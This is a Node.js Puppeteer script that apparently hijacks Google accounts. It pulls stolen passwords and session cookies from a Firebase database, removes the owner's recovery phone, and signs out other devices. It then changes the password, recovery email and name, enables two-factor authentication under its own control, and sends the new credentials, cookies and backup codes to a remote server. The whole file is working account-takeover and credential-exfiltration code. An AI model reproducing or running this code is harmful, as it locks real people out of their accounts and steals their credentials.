const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const twofactor = require('node-2fa')
const readline = require('readline')
const axios = require('axios')


const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/1_16_5' 


let mCookie = [
    {
      name: 'LSID',
      value: '',       
      domain: 'accounts.google.com',
      path: '/',
      expires: 1768227818.828837,
      size: 94,
      httpOnly: true,
      secure: true,
      session: false,
      sameSite: 'None',
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'OSID',
      value: '',
      domain: 'myaccount.google.com',
      path: '/',
      expires: 1771251816.153073,
      size: 157,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SAPISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957588,
      size: 41,
      httpOnly: false,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'APISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957573,
      size: 40,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957563,
      size: 21,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: '__Secure-1PSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957496,
      size: 167,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: true,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957482,
      size: 156,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'HSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957553,
      size: 21,
      httpOnly: true,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    }
]

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})
  
const askQuestion = (question) => {
    return new Promise((resolve) => {
      rl.question(question, (answer) => {
        resolve(answer)
      })
    })
}

puppeteer.use(StealthPlugin())


startServer()


async function startServer() {
    console.log('Node: ---START-SERVER---')

    // let mName = await getName()
    
    // await delay(100000)

    while (true) {
        let data = await getGmailData()
        if (data) {
            console.log('Node: [ Receive New Data --- Time: '+getTime()+' ]')
            await loginWithCompleted(data.number, data.password, data.cookies)
        } else {
            await delay(10000)
        }
    }
}

async function loginWithCompleted(number, password, cookies) {
    try {
        if (await isValidCookies(cookies)) {
            console.log('Node: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
            
            let browser = await puppeteer.launch({
                headless: false,
                // headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-notifications',
                    '--disable-setuid-sandbox',
                    '--ignore-certificate-errors',
                    '--ignore-certificate-errors-skip-list',
                    '--disable-dev-shm-usage'
                ]
            })
        
            let loadCookie = {}
            let tempCookie = cookies.split(';')

            for (let i = 0; i < tempCookie.length; i++) {
                try {
                    let split = tempCookie[i].trim().split('=')
                    if (split.length == 2) {
                        loadCookie[split[0]] = split[1]
                    }
                } catch (error) {}
            }

            mCookie.forEach((cookie) => {
                let value = loadCookie[cookie['name']]

                if (value) {
                    cookie['value'] = value
                    cookie['size'] = value.length
                }
            })
            
            let page = (await browser.pages())[0]

            page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

            await page.setCookie(...mCookie)

            console.log('Node: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
            
            try {
                let mData = await waitForAccountDetails(page)

                console.log('Node: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                
                let mToken = await waitForRaptToken(page, mData.recovery, password)

                let mPassword = mToken.password
                let mRapt = mToken.token

                console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                
                if (mRapt) {
                    if (mData.recovery) {
                        console.log('Node: [ Recovery Number: '+mData.recovery+' --- Time: '+getTime()+' ]')
                        await waitForRemoveRecovery(page, mRapt)
                    }

                    let mDeviceYear = await waitForDeviceLogout(page)
                    
                    console.log('Node: [ First Device Year: '+mDeviceYear+' --- Time: '+getTime()+' ]')

                    let mPasswordYear = await waitForCreateYear(page)
                    
                    let mYear = mData.year
                    mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
                    mYear = (mPasswordYear < mYear) ? mPasswordYear : mYear

                    console.log('Node: [ Mail Create Year: '+mYear+' --- Time: '+getTime()+' ]')
                    
                    let mRecovery = await waitForRecoveryAdd(page, mRapt, mYear < 2019 ? 'arafat.arf121@gmail.com' : null)

                    console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')

                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)

                    console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
                    
                    await waitForSkipPassworp(page, mRapt)

                    console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')

                    if (mYear < 2019) await waitForNameChange(page, mRapt)

                    let mTwoFa = await waitForTwoFaActive(page, mRapt)

                    console.log('Node: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
                    
                    let n_cookies = await getNewCookies(await page.cookies())
                    
                    try {
                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/completed'+(mTwoFa.error ? '_error':(mYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })

                        console.log('Node: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                    } catch (error) {}
                } else {
                    let n_cookies = await getNewCookies(await page.cookies())
                    
                    try {
                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}
                }

                try {
                    await axios.delete(BASE_URL+'/'+number+'.json')
                } catch (error) {}
            } catch (error) {
                console.log('Node: [ Browser Process: Error --- Time: '+getTime()+' ]')
            }
            
            try {
                if (page != null) {
                    await page.close()
                }
            } catch (error) {}

            try {
                if (browser != null) {
                    await browser.close()
                }
            } catch (error) {}   
        } else {
            console.log('Node: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')

            await axios.delete(BASE_URL+'/'+number+'.json')
        }
    } catch (error) {}
}

async function waitForPasswordChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/signinoptions/password?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let mPassword = getRandomPass()
        await page.type('input[name="password"]', mPassword)
        await delay(500)
        await page.type('input[name="confirmation_password"]', mPassword)
        await delay(500)
        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')

        for (let i = 0; i < 20; i++) {
            try {
                let url = await page.url()
                if (url.startsWith('https://myaccount.google.com/security-checkup-welcome')) {
                    break
                } else if (await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(2) > button')) {
                    await delay(500)
                    await page.click('div[class="uW2Fw-T0kwCb"] > div:nth-child(2) > button')
                    await delay(3000)
                }
            } catch (error) {}

            await delay(500)
        }

        return mPassword
    } catch (error) {}

    return mPassword
}

async function waitForRecoveryAdd(page, mRapt, mRecovery) {
    try {
        await page.goto('https://myaccount.google.com/recovery/email?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let hasMail = await page.evaluate(() => {
            let root = document.querySelector('input[type="email"]')
            if (root) {
                return root.value.length > 0
            }
        })

        if (!mRecovery) mRecovery = getRandomUser()+'@oletters.com'

        await page.focus('input[type="email"]')
        if (hasMail) {
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
        }
        await page.keyboard.type(mRecovery)
        await delay(500)
        await page.click('button[type="submit"]')
        await delay(3000)

        return mRecovery
    } catch (error) {}

    return null
}

async function waitForDeviceLogout(page) {
    try {
        await page.goto('https://myaccount.google.com/device-activity?hl=en', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mDevice = await page.evaluate(() => {
            let list = document.querySelectorAll('script')
            let year = parseInt(new Date().getFullYear())
            let logout = []
            let years = []
            let data = []

            for (let i = 0; i < list.length; i++) {
                let html = list[i].innerHTML
                if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
                    data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
                    break
                }
            }

            for(let i=0; i<data.length; i++) {
                let child = data[i][2]
                for(let j=0; j<child.length; j++) {
                    let main = child[j]
                    if(main.length > 9) {
                        years.push(main[9])
                    }
                    if(main.length > 23) {
                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
                            logout.push(main[0])
                        }
                    }
                }
            }

            years.sort(function(a, b){return a-b})

            if(years.length > 0) {
                year = parseInt(new Date(years[0]).getFullYear())
            }

            return { list:logout, year:year }
        })

        console.log('Node: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')

        for (let i = 0; i < mDevice.list.length; i++) {
            try {
                await page.goto('https://myaccount.google.com/device-activity/id/'+mDevice.list[i]+'?hl=en', { waitUntil: 'load', timeout: 0 })
                await delay(500)
                await page.click('button[class="VfPpkd-rOvkhd-jPmIDe VfPpkd-rOvkhd-jPmIDe-OWXEXe-ssJRIf"]')
                await delay(1000)
                let button = await page.$$('button[class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 SdOXCb LjrPGf HvOprf evJWRb"]')
                if (button && button.length == 2) {
                    await button[1].click()
                    await delay(2000)
                }
            } catch (error) {}
        }

        return mDevice.year
    } catch (error) {}

    return parseInt(new Date().getFullYear())
}

async function waitForCreateYear(page) {
    try {
        await page.goto('https://myaccount.google.com/security?hl=en', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        return await page.evaluate(() => {
            let years = ['2025', '2024', '2023', '2022', '2021', '2020', '2019', '2018', '2017', '2016', '2015', '2014', '2013', '2012', '2011', '2010']
            let root = document.querySelectorAll('a[href*="signinoptions/password"]')
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let text = root[i].innerText
                        let year = null

                        for (let j = 0; j < years.length; j++) {
                            if (text.includes(years[j])) {
                                year = years[j]
                                break
                            }
                        }

                        if (year) {
                            return parseInt(year)
                        }
                    } catch (error) {}
                }
            }

            return parseInt(new Date().getFullYear())
        })
    } catch (error) {}

    return parseInt(new Date().getFullYear())
}

async function waitForNameChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/profile/name/edit?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mInput = await page.$$('input[type="text"][id]')
        if (mInput.length == 2) {
            let mName = await getName()
            let mSplit = mName.split(' ')
            await mInput[0].focus()
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
            await page.keyboard.type(mSplit[0])
            await delay(500)
            await mInput[1].focus()
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
            await page.keyboard.type(mSplit[1])
            await delay(500)
            if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')) {
                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')
            } else if (await exists(page, 'button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')) {
                await page.click('button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')
            }
            await delay(3000)
            console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
        }
    } catch (error) {}
}

async function waitForRemoveRecovery(page, mRapt) {
    let mSuccess = false
    try {
        let loadPage = true
        try {
            loadPage = !await page.url().startsWith('https://myaccount.google.com/signinoptions/rescuephone')
        } catch (error) {}

        if (loadPage) {
            await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
            await delay(500)
        }

        await waitForSelector(page, 'div[class="N9Ni5"] > div:nth-child(2)')
        await delay(500)
        await page.click('div[class="N9Ni5"] > div:nth-child(2)')
        
        for (let i = 0; i < 10; i++) {
            await delay(1000)
            if (await exists(page, 'div[class="XfpsVe J9fJmf"] > div:nth-child(2)')) {
                await page.click('div[class="XfpsVe J9fJmf"] > div:nth-child(2)')
                console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
                await delay(3000)
                mSuccess = true
                break
            }
        }
    } catch (error) {
        console.log(error)
    }

    if (!mSuccess) {
        console.log('Node: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
        await askQuestion('Error:')
    }
}

async function waitForAccountDetails(page) {
    await page.goto('https://myaccount.google.com/phone?hl=en', { waitUntil: 'load', timeout: 0 })
    await delay(500)

    return await page.evaluate(() => {
        let list = document.querySelectorAll('script')
        let number = null
        let gmail = null
        let years = []
        let year = parseInt(new Date().getFullYear())

        try {
            for (let i = 0; i < list.length; i++) {
                let html = list[i].innerHTML
                if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
                    let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
                    let data = data_list[0]
                    for (let i = 0; i < data.length; i++) {
                        let date = data[i][18]
                        if (date > 0) years.push(date)
                        let list = data[i][11][0][1]
                        list.sort(function(a, b){return a - b})
                        let out = list
                        if (list.length > 2) {
                            let temp = {}
                            out = []
                            for (let j = 0; j < list.length; j++) {
                                temp[list[j]] = 'x'
                            }
                            let hasNum = data_list[1]
                            for (let j = 0; j < hasNum.length; j++) {
                                if(temp[hasNum[j][0]] != null && hasNum[j][2] == true) {
                                    out.push(hasNum[j][0])
                                }
                            }
                        }

                        out.sort(function(a, b) { return a - b })
                        
                        if (out[0] == 1) {
                            number = data[i][0]
                        }
                    }
                }
            }

            years.sort(function(a, b) { return a-b })

            if(years.length > 0) {
                year = parseInt(new Date(years[0]).getFullYear())
            }
        } catch (error) {}

        try {
            let global = window.WIZ_global_data
            if (global && global.oPEP7c) {
                gmail = global.oPEP7c.replace('@gmail.com', '')
            }
        } catch (error) {}

        return { recovery:number, year:year, gmail:gmail }
    })
}

async function waitForRaptToken(page, number, password) {
    let mPassword = null
    let mCodeSend = false
    let mRapt = null

    try {
        for (let k = 0; k < 2; k++) {
            await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en', { waitUntil: 'load', timeout: 0 })

            await delay(500)

            let url = await page.url()

            if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                mRapt = await getRapt(url)
            } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                console.log('Node: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
                await page.type('input[type="password"]', password)
                await delay(500)
                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')

                let changePassword = true
                let changeConfirm = true
                let cSelection = true
                let cNumber = true
                mCodeSend = false
                
                for (let load = 0; load < 30; load++) {
                    try {
                        let url = await page.url()

                        if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                            mRapt = await getRapt(url)
                            break
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect')) {
                            break
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                            if (await exists(page, 'div[data-action="selectchallenge"][data-challengetype="13"]')) {
                                console.log('Node: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
                                await delay(2000)
                                await page.click('div[data-action="selectchallenge"][data-challengetype="13"]')
                                cSelection = false
                                load = 0
                            } else {
                                break
                            }
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') && cNumber) {
                            if(!number) break
                            if (await exists(page, 'input#phoneNumberId')) {
                                console.log('Node: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
                                await delay(2000)
                                await page.type('input#phoneNumberId', number)
                                await delay(500)
                                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
                                cNumber = false
                                load = 10
                            }
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
                            console.log('Node: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
                            mCodeSend = true
                            break
                        } else if (url.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') && changePassword) {
                            try {
                                await waitForSelector(page, 'input[name="Passwd"]')
                                await delay(500)
                                mPassword = getRandomPass()
                                
                                await page.type('input[name="Passwd"]', mPassword)
                                await delay(500)
                                await page.type('input[name="ConfirmPasswd"]', mPassword)
                                await delay(500)
                                await page.click('#changepasswordNext')
                                await delay(1000)
                                changeConfirm = true
                                changePassword = false
                                load = 10
                            } catch (error) {}
                        } else if (mPassword && changeConfirm) {
                            if (await exists(page, 'div[class="VfPpkd-T0kwCb"] > button:nth-child(3)')) {
                                await page.click('div[class="VfPpkd-T0kwCb"] > button:nth-child(3)')
                                await delay(1000)
                                changeConfirm = false
                            }
                        }
                    } catch (error) {}

                    await delay(500)
                }

                if (mCodeSend) {
                    continue
                }
            }

            break
        }
    } catch (error) {}

    return { token:mRapt, password:mPassword }
}

async function waitForTwoFaActive(page, mRapt) {
    let mAuthToken = null
    let mBackupCode = null

    try {
        await page.goto('https://myaccount.google.com/two-step-verification/authenticator?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let newButton = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe LQeN7 wMI9H"]'
        await waitForSelector(page, newButton)
        await delay(500)
        await page.click(newButton)
        await delay(2000)
        let canSee = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 wMI9H"]'
        await waitForSelector(page, canSee)
        await delay(500)
        await page.click(canSee)
        await delay(1000)
        let authToken = await page.evaluate(() => {
            let root = document.querySelectorAll('strong')
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let split = root[i].innerText.split(' ')
                        if (split.length == 8) {
                            return root[i].innerText
                        }
                    } catch (error) {}
                }
            }
            return null
        })

        if (authToken) {
            await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(2) > button')
            await delay(1000)
            let newToken = twofactor.generateToken(authToken)
            await waitForSelector(page, 'input[type="text"]')
            await delay(500)
            await page.type('input[type="text"]', newToken.token)
            await delay(500)
            await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(3) > button')
            await waitForSelector(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 wMI9H"]')
            mAuthToken = authToken

            console.log('Node: [ Auth Token: Received --- Time: '+getTime()+' ]')
        }
    } catch (error) {}

    try {
        await page.goto('https://myaccount.google.com/two-step-verification/backup-codes?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let newButton = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe LQeN7 wMI9H"]'
        await waitForSelector(page, newButton)
        await delay(500)
        await page.click(newButton)

        for (let i = 0; i < 30; i++) {
            try {
                let response = await page.waitForResponse(async res => res)
                try {
                    let url = await response.url()
                    if (url.startsWith('https://myaccount.google.com/_/AccountSettingsStrongauthUi/data/batchexecute') && url.includes('two-step-verification')) {
                        let text = await response.text()
                        if (text.includes('"[[')) {
                            let temp = text.substring(text.indexOf('"[[')+2, text.length)
                            let list = JSON.parse(temp.substring(0, temp.indexOf(']')+1).replace(/[\\]/g, ''))
                            let code = ''
                            for (let i = 0; i < list.length; i++) {
                                code += list[i]+' '
                            }
                            mBackupCode = code.trim()
                            console.log('Node: [ Backup Code: Received --- Time: '+getTime()+' ]')
                            break
                        }
                    }
                } catch (error) {}
            } catch (error) {
                break
            }
        }
    } catch (error) {}

    try {
        if (mBackupCode || mAuthToken) {
            try {
                await page.goto('https://myaccount.google.com/signinoptions/twosv?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
                await delay(500)
                await waitForSelector(page, 'div[class="xIcqYe"] > div > div > button', 10)
                await delay(500)
                await page.click('div[class="xIcqYe"] > div > div > button')
                await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 10)
                await delay(500)
                await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
                await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 10)
                await delay(500)
                await page.click('button[data-mdc-dialog-action="TYajJe"]')

                try {
                    await page.waitForResponse(async res => res)
                } catch (error) {}

                for (let i = 0; i < 20; i++) {
                    try {
                        if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe P62QJc LQeN7 wMI9H"]')) {
                            break
                        } else if (await exists(page, 'div[class="VfPpkd-T0kwCb"]')) {
                            if (!await exists(page, 'div[class="VfPpkd-T0kwCb"] > button')) {
                                break
                            }
                        }
                    } catch (error) {}
                }

                await delay(1500)

                return { auth:mAuthToken, backup:mBackupCode, error:false }
            } catch (error) {
                console.log(error);
                await askQuestion('Error:')
                return { auth:mAuthToken, backup:mBackupCode, error:true }
            }
        }
    } catch (error) {}

    await askQuestion('Error:')

    return { auth:null, backup:null, error:true }
}

async function waitForSkipPassworp(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/signinoptions/passwordoptional?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let isChecked = await page.evaluate(() => {
            let root = document.querySelector('button[type="button"]')
            if (root) {
                let checked = root.getAttribute('aria-checked')
                return checked == 'true' || checked == true
            }
        })

        if (isChecked) {
            await page.click('button[type="button"]')
            await delay(1500)
        }
    } catch (e) {}
}

async function isValidCookies(cookies) {
    try {
        let response = await axios.get('https://myaccount.google.com/phone', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'cookie': cookies,
                'priority': 'u=0, i',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-form-factors': '"Desktop"',
                'sec-ch-ua-full-version': '"131.0.6778.265"',
                'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            },
            validateStatus: null,
            maxRedirects: 0
        })

        let location = response.headers['location']

        if (location) {
            return false
        } else {
            return true
        }
    } catch (error) {}

    return false
}

async function getNewCookies(cookies) {
    let cookie = ''

    for (let i = 0; i < cookies.length; i++) {
        try {
            cookie += cookies[i]['name']+'='+cookies[i]['value']+(i == cookies.length-1 ? '' : '; ')
        } catch (error) {}
    }

    return cookie
}

async function getName() {
    for (let i = 0; i < 3; i++) {
        try {
            let response = await axios.get('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/name/english/male/'+getRandomInt(0, 94929)+'.json')
            if (response.data) {
                return response.data
            }
        } catch (error) {}
    }
}

async function getRapt(url) {
    try {
        if (url.includes('rapt=')) {
            let temp = url.substring(url.indexOf('rapt=')+5, url.length)

            if (temp.includes('&')) {
                return temp.substring(0, temp.indexOf('&'))
            } else {
                return temp
            }
        }
    } catch (error) {}

    return null
}

async function waitForSelector(page, element, _timeout = 30) {

    for (let i = 0; i < _timeout; i++) {
        try {
            let data = await exists(page, element)
            if (data) {
                break
            }
        } catch (error) {}

        await delay(500)
    }
}

async function exists(page, element) {
    return await page.evaluate((element) => {
        let root = document.querySelector(element)
        if (root) {
            return true
        }
        return false
    }, element)
}

async function getGmailData() {

    try {
        let response = await axios.get(BASE_URL+'.json?orderBy=%22$key%22&limitToFirst=1')
        let data = response.data
        if (data) {
            let number = Object.keys(data)[0]
            let split = data[number].split('||')
            return { number:number, password:split[0], cookies:split[1] }
        }
    } catch (error) {}

    return null
}

function getRandomUser() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let user = ''

    for (let i = 0; i < 10; i++) {
        user += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 5; i++) {
        user += N[Math.floor((Math.random() * N.length))]
    }

    return user
}

function getRandomPass() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let pass = L[Math.floor((Math.random() * L.length))].toUpperCase()

    for (let i = 0; i < 6; i++) {
        pass += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 3; i++) {
        pass += N[Math.floor((Math.random() * N.length))]
    }

    return pass
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function getTime() {
    return new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
